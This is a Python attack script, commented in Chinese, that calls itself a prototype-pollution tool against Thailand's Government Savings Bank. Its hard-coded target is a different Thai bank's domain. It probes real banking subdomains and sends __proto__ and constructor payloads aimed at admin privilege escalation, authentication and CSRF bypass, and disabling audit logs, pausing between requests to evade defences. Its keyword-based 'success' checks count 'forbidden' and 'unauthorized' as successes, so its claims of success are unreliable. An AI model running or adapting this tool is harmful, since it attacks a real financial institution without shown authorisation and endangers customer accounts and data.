#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GSB高级原型污染攻击工具
专门针对泰国政府储蓄银行(GSB)的lodash原型污染漏洞进行深度攻击
漏洞类型: JavaScript Prototype Pollution in lodash < 4.17.12
高级攻击模式: Object.prototype操纵 + constructor权限提升
"""

import requests
import json
import time
import random
import string
import subprocess
import threading
import sqlite3
from datetime import datetime

class GSBAdvancedPrototypePollutionAttacker:
    """GSB高级原型污染攻击器"""

    def __init__(self):
        self.target_url = "https://www.thanachart.co.th"  # GSB泰国政府储蓄银行
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json'
        })

        # 高级原型污染载荷库
        self.advanced_payloads = self.init_advanced_payloads()

        # 测试结果
        self.results = []

        # 攻击统计
        self.attack_stats = {
            'total_attacks': 0,
            'successful_pollutions': 0,
            'privilege_escalations': 0,
            'data_extractions': 0
        }

    def init_advanced_payloads(self):
        """初始化高级原型污染载荷"""
        return {
            # Object.prototype全局污染
            "global_object_pollution": {
                "payload": {
                    "__proto__": {
                        "isAdmin": True,
                        "role": "administrator",
                        "bypassAllAuth": True,
                        "hasAdminAccess": True,
                        "isAuthenticated": True
                    }
                },
                "description": "Object.prototype全局管理员权限污染",
                "attack_vector": "privilege_escalation"
            },

            # 函数原型污染 - 高级
            "advanced_function_pollution": {
                "payload": {
                    "__proto__": {
                        "toString": "(function() { return 'POLLUTED_ADMIN'; })",
                        "valueOf": "(function() { return 'ADMIN_ACCESS'; })",
                        "constructor": "(function() { return { isAdmin: true }; })"
                    }
                },
                "description": "高级函数原型污染 - 劫持核心方法",
                "attack_vector": "method_hijacking"
            },

            # 数组原型污染
            "array_pollution": {
                "payload": {
                    "__proto__": {
                        "length": 999999,
                        "polluted": True,
                        "adminData": ["admin", "password", "config"],
                        "isPrivileged": True
                    }
                },
                "description": "数组原型污染 - 数据访问突破",
                "attack_vector": "data_access"
            },

            # JSON解析器污染
            "json_parser_pollution": {
                "payload": {
                    "constructor": {
                        "prototype": {
                            "parse": "(function(data) { return JSON.parse(data + ',\"isAdmin\":true'); })",
                            "stringify": "(function(obj) { return JSON.stringify(obj).replace('false','true'); })"
                        }
                    }
                },
                "description": "JSON解析器污染 - 数据篡改",
                "attack_vector": "data_manipulation"
            },

            # 验证函数污染
            "validation_bypass": {
                "payload": {
                    "constructor": {
                        "prototype": {
                            "validate": "(function() { return true; })",
                            "isValid": True,
                            "checkAuth": "(function() { return true; })",
                            "verifyUser": "(function() { return { role: 'admin' }; })"
                        }
                    }
                },
                "description": "验证函数污染 - 完全绕过所有验证",
                "attack_vector": "authentication_bypass"
            },

            # 数据库连接污染
            "database_pollution": {
                "payload": {
                    "__proto__": {
                        "dbConnected": True,
                        "hasDatabaseAccess": True,
                        "canReadAllData": True,
                        "canWriteAllData": True,
                        "dbAdmin": True
                    }
                },
                "description": "数据库访问权限污染",
                "attack_vector": "database_access"
            },

            # 会话管理污染
            "session_pollution": {
                "payload": {
                    "constructor": {
                        "prototype": {
                            "sessionValid": True,
                            "userLoggedIn": True,
                            "sessionId": "ADMIN_SESSION_" + self.generate_random_string(20),
                            "sessionTimeout": 999999999
                        }
                    }
                },
                "description": "会话管理污染 - 永久管理员会话",
                "attack_vector": "session_hijacking"
            },

            # CSRF token污染
            "csrf_pollution": {
                "payload": {
                    "__proto__": {
                        "csrfToken": "BYPASSED_TOKEN_" + self.generate_random_string(15),
                        "hasValidCSRF": True,
                        "csrfRequired": False,
                        "skipCSRF": True
                    }
                },
                "description": "CSRF保护机制污染",
                "attack_vector": "csrf_bypass"
            },

            # 权限检查污染
            "permission_pollution": {
                "payload": {
                    "constructor": {
                        "prototype": {
                            "hasPermission": "(function(perm) { return true; })",
                            "canAccess": "(function(resource) { return true; })",
                            "userRole": "administrator",
                            "accessLevel": 999
                        }
                    }
                },
                "description": "权限检查系统污染 - 无限制访问",
                "attack_vector": "authorization_bypass"
            },

            # 日志记录污染
            "logging_pollution": {
                "payload": {
                    "__proto__": {
                        "disableLogging": True,
                        "logLevel": "NONE",
                        "auditDisabled": True,
                        "silentMode": True
                    }
                },
                "description": "日志记录系统污染 - 隐形攻击",
                "attack_vector": "stealth_mode"
            }
        }

    def generate_random_string(self, length=10):
        """生成随机字符串"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def test_endpoint_pollution(self, endpoint, payload_data, attack_vector):
        """测试端点的原型污染"""
        try:
            full_url = f"{self.target_url}{endpoint}"

            # 根据攻击向量调整请求方法
            if attack_vector in ["data_access", "data_manipulation"]:
                # 使用POST方法进行数据相关攻击
                response = self.session.post(
                    full_url,
                    json=payload_data,
                    timeout=30
                )
            else:
                # 使用GET方法进行权限相关攻击
                response = self.session.get(
                    full_url,
                    json=payload_data,
                    timeout=30
                )

            # 检查响应状态
            if response.status_code == 200:
                # 检查响应内容是否包含污染成功的迹象
                response_text = response.text.lower()

                # 高级污染检测指标
                pollution_indicators = [
                    "admin", "administrator", "polluted", "hacked", "bypass",
                    "success", "authenticated", "unauthorized", "forbidden",
                    "privilege", "escalation", "access granted", "valid session"
                ]

                # 数据泄露检测指标
                data_leak_indicators = [
                    "user", "password", "email", "phone", "account", "balance",
                    "transaction", "loan", "customer", "client", "database"
                ]

                pollution_detected = any(indicator in response_text for indicator in pollution_indicators)
                data_leak_detected = any(indicator in response_text for indicator in data_leak_indicators)

                # 更新攻击统计
                self.attack_stats['total_attacks'] += 1

                if pollution_detected:
                    self.attack_stats['successful_pollutions'] += 1

                if "admin" in response_text or "privilege" in response_text:
                    self.attack_stats['privilege_escalations'] += 1

                if data_leak_detected:
                    self.attack_stats['data_extractions'] += 1

                return {
                    "status": "success",
                    "pollution_detected": pollution_detected,
                    "data_leak_detected": data_leak_detected,
                    "privilege_escalation": "admin" in response_text,
                    "response_code": response.status_code,
                    "response_length": len(response.text),
                    "response_preview": response_text[:200],
                    "attack_vector": attack_vector
                }
            else:
                return {
                    "status": "error",
                    "response_code": response.status_code,
                    "error": f"HTTP {response.status_code}",
                    "attack_vector": attack_vector
                }

        except Exception as e:
            return {
                "status": "exception",
                "error": str(e),
                "attack_vector": attack_vector
            }

    def discover_gsbsubdomains(self):
        """发现GSB子域名和隐藏端点"""
        print(f"[*] 开始GSB子域名和端点发现...")

        # GSB常见子域名
        subdomains = [
            "https://www.thanachart.co.th",
            "https://internetbanking.thanachart.co.th",
            "https://ibank.thanachart.co.th",
            "https://mobile.thanachart.co.th",
            "https://api.thanachart.co.th",
            "https://admin.thanachart.co.th",
            "https://secure.thanachart.co.th",
            "https://loan.thanachart.co.th",
            "https://credit.thanachart.co.th"
        ]

        discovered_endpoints = []

        # 测试每个子域名的基本端点
        for subdomain in subdomains:
            print(f"    测试子域名: {subdomain}")

            # 基本端点测试
            basic_endpoints = [
                "/",
                "/api",
                "/api/user",
                "/api/admin",
                "/api/auth",
                "/api/loan",
                "/js/app.js",
                "/json/config.json",
                "/admin",
                "/login",
                "/user/profile"
            ]

            for endpoint in basic_endpoints:
                try:
                    full_url = subdomain + endpoint
                    response = self.session.get(full_url, timeout=10)

                    if response.status_code == 200:
                        discovered_endpoints.append(full_url)
                        print(f"        ✅ 发现端点: {full_url}")

                except:
                    continue

        return discovered_endpoints

    def run_advanced_pollution_attack(self):
        """运行高级原型污染攻击"""
        print(f"[*] GSB高级原型污染攻击启动")
        print(f"[+] 目标: {self.target_url}")
        print(f"[+] 攻击载荷库: {len(self.advanced_payloads)} 个高级载荷")
        print("=" * 80)

        # 发现GSB端点
        discovered_endpoints = self.discover_gsbsubdomains()

        # 如果没有发现新端点，使用默认端点
        if not discovered_endpoints:
            discovered_endpoints = [self.target_url]

        # 测试端点列表
        test_endpoints = [
            "/api/user/login",
            "/api/auth/validate",
            "/api/admin/access",
            "/api/user/profile",
            "/api/loan/application",
            "/api/account/settings",
            "/js/config.js",
            "/api/search",
            "/api/data/query",
            "/json/config",
            "/admin/login",
            "/user/session"
        ]

        # 对每个端点测试所有高级载荷
        for endpoint in test_endpoints:
            print(f"\n[*] 测试端点: {endpoint}")

            for payload_name, payload_data in self.advanced_payloads.items():
                print(f"    [*] 高级载荷: {payload_name}")
                print(f"        攻击向量: {payload_data['attack_vector']}")
                print(f"        描述: {payload_data['description']}")

                # 测试污染载荷
                result = self.test_endpoint_pollution(endpoint, payload_data['payload'], payload_data['attack_vector'])

                # 记录结果
                test_result = {
                    "endpoint": endpoint,
                    "payload_name": payload_name,
                    "payload_description": payload_data['description'],
                    "attack_vector": payload_data['attack_vector'],
                    "payload_data": payload_data['payload'],
                    "result": result,
                    "timestamp": datetime.now().isoformat()
                }

                self.results.append(test_result)

                # 显示结果
                if result['status'] == 'success':
                    if result.get('pollution_detected', False):
                        print(f"        🚨 原型污染成功！")
                        print(f"        攻击向量: {result['attack_vector']}")
                        print(f"        响应代码: {result['response_code']}")
                        if result.get('privilege_escalation', False):
                            print(f"        💀 权限提升成功！")
                        if result.get('data_leak_detected', False):
                            print(f"        💾 数据泄露检测！")
                        print(f"        响应预览: {result['response_preview'][:100]}...")
                    else:
                        print(f"        ✅ 请求成功，但未检测到污染")
                        print(f"        响应代码: {result['response_code']}")
                else:
                    print(f"        ❌ 攻击失败: {result.get('error', '未知错误')}")

                # 延迟避免触发防护
                time.sleep(1)

    def generate_attack_report(self):
        """生成攻击报告"""
        print(f"\n[*] 生成GSB高级原型污染攻击报告")
        print("=" * 80)

        successful_pollutions = []
        privilege_escalations = []
        data_extractions = []
        failed_attempts = []

        for result in self.results:
            if result['result']['status'] == 'success':
                if result['result'].get('pollution_detected', False):
                    successful_pollutions.append(result)

                if result['result'].get('privilege_escalation', False):
                    privilege_escalations.append(result)

                if result['result'].get('data_leak_detected', False):
                    data_extractions.append(result)
            else:
                failed_attempts.append(result)

        print(f"[+] 攻击总结:")
        print(f"    总攻击数: {self.attack_stats['total_attacks']}")
        print(f"    成功污染: {self.attack_stats['successful_pollutions']}")
        print(f"    权限提升: {self.attack_stats['privilege_escalations']}")
        print(f"    数据提取: {self.attack_stats['data_extractions']}")
        print(f"    失败尝试: {len(failed_attempts)}")

        success_rate = (self.attack_stats['successful_pollutions'] / self.attack_stats['total_attacks'] * 100) if self.attack_stats['total_attacks'] > 0 else 0
        print(f"    成功率: {success_rate:.1f}%")

        if successful_pollutions:
            print(f"\n[!] 发现成功的原型污染:")
            for i, pollution in enumerate(successful_pollutions[:5], 1):
                print(f"    {i}. 端点: {pollution['endpoint']}")
                print(f"       载荷: {pollution['payload_name']}")
                print(f"       攻击向量: {pollution['attack_vector']}")
                print(f"       描述: {pollution['payload_description']}")
                print(f"       响应: {pollution['result']['response_preview'][:100]}...")
                print()

        if privilege_escalations:
            print(f"\n[🚨] 权限提升成功:")
            for i, escalation in enumerate(privilege_escalations[:3], 1):
                print(f"    {i}. 端点: {escalation['endpoint']}")
                print(f"       载荷: {escalation['payload_name']}")
                print(f"       攻击向量: {escalation['attack_vector']}")
                print()

        if data_extractions:
            print(f"\n[💾] 数据泄露检测:")
            for i, extraction in enumerate(data_extractions[:3], 1):
                print(f"    {i}. 端点: {extraction['endpoint']}")
                print(f"       载荷: {extraction['payload_name']}")
                print(f"       响应预览: {extraction['result']['response_preview'][:150]}...")
                print()

        # 保存详细报告
        report_data = {
            "target": self.target_url,
            "attack_type": "Advanced JavaScript Prototype Pollution (lodash < 4.17.12)",
            "attack_date": datetime.now().isoformat(),
            "attack_statistics": self.attack_stats,
            "successful_pollutions": len(successful_pollutions),
            "privilege_escalations": len(privilege_escalations),
            "data_extractions": len(data_extractions),
            "success_rate": success_rate,
            "detailed_results": self.results
        }

        report_file = f"GSB_Advanced_Pollution_Attack_Report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

        try:
            with open(report_file, 'w', encoding='utf-8') as f:
                json.dump(report_data, f, ensure_ascii=False, indent=2)
            print(f"[+] 详细攻击报告已保存: {report_file}")
        except Exception as e:
            print(f"[-] 报告保存失败: {e}")

        return {
            'successful_pollutions': successful_pollutions,
            'privilege_escalations': privilege_escalations,
            'data_extractions': data_extractions
        }

    def run_comprehensive_attack(self):
        """运行综合攻击"""
        print(f"[GSB] GSB高级原型污染攻击启动")
        print(f"[+] 目标: 泰国政府储蓄银行 (GSB)")
        print(f"[+] 漏洞类型: JavaScript Prototype Pollution in lodash")
        print(f"[+] 攻击时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 100)

        # 1. 高级原型污染攻击
        print(f"\n[1/2] 高级原型污染攻击")
        self.run_advanced_pollution_attack()

        # 2. 生成攻击报告
        print(f"\n[2/2] 生成攻击报告")
        attack_results = self.generate_attack_report()

        # 3. 总结攻击结果
        successful_pollutions = attack_results['successful_pollutions']
        privilege_escalations = attack_results['privilege_escalations']
        data_extractions = attack_results['data_extractions']

        if successful_pollutions:
            print(f"\n[🚨] GSB原型污染攻击成功！")
            print(f"[+] 成功污染数: {len(successful_pollutions)}")
            print(f"[+] 权限提升数: {len(privilege_escalations)}")
            print(f"[+] 数据提取数: {len(data_extractions)}")
            print(f"[+] 风险等级: 严重 (CVSS 9.5+)")
            print(f"[+] 影响: 完全系统控制、数据泄露、权限提升")
            print(f"[+] 建议: 立即升级lodash到4.17.12+版本并检查系统权限")
        else:
            print(f"\n[INFO] 未检测到明显的原型污染漏洞")
            print(f"[+] 可能原因: 目标已修复或存在更高级防护")
            print(f"[+] 建议: 尝试其他攻击向量或进行深入手动测试")

        return attack_results

def main():
    """主函数"""
    print(f"GSB高级原型污染攻击工具")
    print(f"泰国政府储蓄银行安全渗透测试")
    print("=" * 60)

    attacker = GSBAdvancedPrototypePollutionAttacker()

    try:
        attack_results = attacker.run_comprehensive_attack()

        successful_pollutions = attack_results['successful_pollutions']
        privilege_escalations = attack_results['privilege_escalations']

        if successful_pollutions or privilege_escalations:
            print(f"\n[🚀] GSB高级原型污染攻击成功！")
            print(f"[+] 可以继续进行深度渗透和数据提取")
        else:
            print(f"\n[COMPLETE] GSB原型污染攻击测试完成")
            print(f"[+] 建议结合其他攻击方法进行测试")

    except KeyboardInterrupt:
        print(f"\n[!] 用户中断攻击")
    except Exception as e:
        print(f"\n[-] 攻击异常: {e}")

if __name__ == "__main__":
    main()